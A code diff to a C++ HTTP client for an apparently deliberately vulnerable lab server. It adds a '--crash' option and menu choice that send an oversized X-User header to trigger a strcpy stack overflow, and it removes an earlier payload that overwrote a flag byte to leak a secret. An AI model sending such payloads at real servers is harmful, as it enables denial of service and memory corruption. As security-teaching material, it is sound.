@@ -45,7 +45,30 @@ int client::clientRequest(int argc, char *argv[]) {
   VSocket *client;
   int st, port = 8080;  // TCP Port 8080
   char buffer[MAXBUFFER];
-  char *serverIP = (char *) "10.1.137.26"; //! The IP has to be the same as the server
+  // Default to localhost; allow overriding via argv[1]
+  std::string serverIPStr = "127.0.0.1";
+  bool crashNow = false;
+  size_t payloadLen = 1000;
+
+  // Naive argument parsing:
+  // - first non-flag arg is IP
+  // - --crash triggers immediate overflow demo
+  // - --len N or --len=N sets payload length
+  for (int i = 1; i < argc; ++i) {
+    std::string arg(argv[i]);
+    if (arg.rfind("--", 0) == 0) {
+      if (arg == "--crash") {
+        crashNow = true;
+      } else if (arg == "--len" && i + 1 < argc) {
+        payloadLen = static_cast<size_t>(std::stoul(argv[++i]));
+      } else if (arg.rfind("--len=", 0) == 0) {
+        payloadLen = static_cast<size_t>(std::stoul(arg.substr(6)));
+      }
+    } else if (serverIPStr == "127.0.0.1") {
+      serverIPStr = arg; // first positional sets IP
+    }
+  }
+  const char* serverIP = serverIPStr.c_str();
 
   memset(buffer, 0, MAXBUFFER);
 
@@ -53,6 +76,37 @@ int client::clientRequest(int argc, char *argv[]) {
   client = new Socket('s');
   client->Connect(serverIP, port);
   std::cout << "Connected to server at " << serverIP << ":" << port << "\n";
+  // If asked, run the crash demo immediately and exit
+  if (crashNow) {
+    std::string payload(payloadLen, 'A');
+    std::string crashRequest =
+      std::string("GET /menu HTTP/1.1\r\n") +
+      "Host: " + serverIP + "\r\n" +
+      "X-User: " + payload + "\r\n" +
+      "Connection: close\r\n\r\n";
+
+    std::cout << "[Crash] Connecting to " << serverIP << ":" << port
+              << ", sending payload length=" << payloadLen << "...\n";
+    client = new Socket('s');
+    client->Connect(serverIP, port);
+    client->Write((char *)crashRequest.c_str(), crashRequest.length());
+
+    std::string response;
+    while (true) {
+      memset(buffer, 0, MAXBUFFER);
+      st = client->Read(buffer, MAXBUFFER);
+      if (st <= 0) break;
+      response.append(buffer, st);
+    }
+
+    if (response.empty()) {
+      std::cout << "[Crash] No response (expected if server crashed)." << std::endl;
+    } else {
+      std::cout << "[Crash] Got response (server may not have crashed):\n" << response << std::endl;
+    }
+    return 0;
+  }
+
   // Build HTTP request to get the menu
   std::string menuRequest = "GET /menu HTTP/1.1\r\nHost: " + std::string(serverIP)
    + "\r\nConnection: close\r\n\r\n";
@@ -74,8 +128,8 @@ int client::clientRequest(int argc, char *argv[]) {
   // Display the cleaned menu
   std::cout << cleanMenu << std::endl;
 
-  // Ask the user to select a book by name or run exploit demo
-  std::cout << "Choose an option:\n1. View a book\n2. Exploit Demo (leak secret)\nEnter 1 or 2: ";
+  // Ask the user to select a book by name or crash demo
+  std::cout << "Choose an option:\n1. View a book\n2. Crash Demo (strcpy overflow)\nEnter 1 or 2: ";
   int option = 0;
   std::cin >> option;
 
@@ -113,18 +167,18 @@ int client::clientRequest(int argc, char *argv[]) {
       std::cout << content << std::endl;
     }
   } else if (option == 2) {
-    // Exploit Demo: trigger overflow via X-User header (more realistic)
-    std::string exploitUsername(32, 'A'); // fill the 32-byte buffer
-    exploitUsername.push_back('\x01');    // write 0x01 to the flag right after buffer
-    std::string exploitRequest =
+  // Crash Demo: trigger stack buffer overflow via long X-User header
+    std::string payload(payloadLen, 'A');
+    std::string crashRequest =
       std::string("GET /menu HTTP/1.1\r\n") +
       "Host: " + serverIP + "\r\n" +
-      "X-User: " + exploitUsername + "\r\n" +
+      "X-User: " + payload + "\r\n" +
       "Connection: close\r\n\r\n";
 
+    std::cout << "Sending overflow payload of length " << payloadLen << " via X-User header...\n";
     client = new Socket('s');
     client->Connect(serverIP, port);
-    client->Write((char *)exploitRequest.c_str(), exploitRequest.length());
+    client->Write((char *)crashRequest.c_str(), crashRequest.length());
 
     response.clear();
     while (true) {
@@ -134,7 +188,11 @@ int client::clientRequest(int argc, char *argv[]) {
       response.append(buffer, st);
     }
 
-    std::cout << "Exploit Demo Response:\n" << response << std::endl;
+    if (response.empty()) {
+      std::cout << "No response received. The server likely crashed due to strcpy overflow." << std::endl;
+    } else {
+      std::cout << "Response received (server may have survived this run):\n" << response << std::endl;
+    }
   }
 
   return 0;
